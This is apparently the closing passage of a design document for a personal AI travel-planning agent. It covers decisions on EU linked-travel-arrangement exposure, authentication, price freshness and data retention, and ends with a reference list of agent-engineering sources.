5. **The LTA information form is not being built, and at this scale that is comfortable.** Recorded because the reasoning matters if the audience ever grows: Directive 2026/1024 — which v1 cited as making us safe — does not apply until 2029, and under the directive in force today, handing a traveller a flight link and a hotel link chosen together in one sitting is close to the Art 3(5)(b) definition of a click-through linked travel arrangement, with Art 19(3) treating a facilitator who omits the Annex II form as a package organiser. **Exposed now, safe from 2029 — the inverse of what v1 claimed.** Planning your own holiday is not facilitating bookings for third parties, so this is dormant; it wakes up the day someone else's trip is planned here.
6. **Auth before the first message.** Reviewers called it a funnel cost. Irrelevant at one user, and it makes memory and limits work from turn zero.
7. **Live prices still move.** With `mayRequote: true` the cashier verifies at hand-off, but a deep link can still expire or sell out between quote and click. Every price renders with its age regardless of source, and the hand-off copy says what it can honestly say.
8. **Retention:** 90 days `model_calls`, 14 days `agent_events`, defined schedules for `proposals`/`link_clicks` rather than v1's "indefinite" — the richest PII in the system, and v1 had the policy backwards.
9. **The affiliate economics are recorded in §1 and not acted on.** Nothing in slice 1 depends on them. If this ever becomes a product, that section is the starting point, not an afterthought.

## 14. References

Parts 1–4 in `docs/`, now carrying inline `REVIEW(globetrotty)` comments where the series' own code needs correcting — most importantly `checkProvenance`, the `MODELS` block, the sweeper, and the fences section.

External: Anthropic, *Building effective agents* · Dex Horthy, *12-Factor Agents* · Marc Brooker, *Exponential Backoff and Jitter* · Brandur Leach, *Idempotency Keys in Postgres* · Simon Willison, *The lethal trifecta* · OWASP LLM Top 10 · Sierra, *τ-bench* · Netlify Background and Scheduled Functions docs · Travelpayouts API access rules and the Hotellook closure FAQ · Agoda MSE · Directive (EU) 2015/2302 Arts 3(5)(b) and 19(3).
